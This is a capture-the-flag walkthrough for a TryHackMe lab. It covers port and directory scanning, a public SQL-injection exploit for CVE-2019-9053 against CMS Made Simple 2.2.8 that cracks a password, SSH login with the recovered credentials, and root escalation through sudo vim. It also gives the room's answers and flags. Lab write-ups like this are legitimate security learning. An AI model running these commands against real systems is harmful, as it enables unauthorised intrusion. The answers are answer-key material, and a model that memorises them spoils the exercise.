# Room: Agentt

## General Info
- **Room link:** [Agentt](https://tryhackme.com/room/agentt)

## Description

Deploy the machine and attempt the questions!

## Provided Files / Links
- [x] Target Machine IP (10.10.222.78)

## Enumeration / Recon
- Ports Enumeration

`nmap -sV 10.10.222.78`

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

How many services are running under port 1000?
**2**

What is running on the higher port?


- Directories Enumeration

`gobuster dir -u 10.10.171.52 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100`

I found this directory:
`/simple               (Status: 301) [Size: 313] [--> http://10.10.171.52/simple/]`

When accessing the page, it's a CMS `CMS Made Simple` and the version is 2.2.8.

When looking for an exploit on this version I found the answer for the next question.

What's the CVE you're using against the application?
**CVE-2019-9053**

To what kind of vulnerability is the application vulnerable?
**SQLi** (SQL Injection)

## Exploitation

I downloaded this python script here https://www.exploit-db.com/exploits/46635 to exploit the CMS.

I ran the following command:
`python3 46635.py -u http://10.10.171.52/simple/ --crack -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt `

And got the following results:
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

What's the password?
**secret**

Where can you login with the details obtained?
**ssh**

## Target machine exploitation

From the results obtained in the first part of this ctf, we know that ssh is actually in port 2222.
To connect through ssh: `ssh mitch@10.10.171.52 -p 2222` with `secret` as the password.

I found the user flag in the user.txt file in the /home/mitch directory:
**G00d j0b, keep up!**

I found another user in the home directory: **sunbath**.

I then tried `sudo -l` to find the user's permissions and found the following:
```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

I then went to https://gtfobins.github.io/gtfobins/vim/ and used this command to get root privleges: `sudo vim -c ':!/bin/sh'`

Being root now, I can find the flag in the root.txt file in the /root directory:
**W3ll d0n3. You made it!**
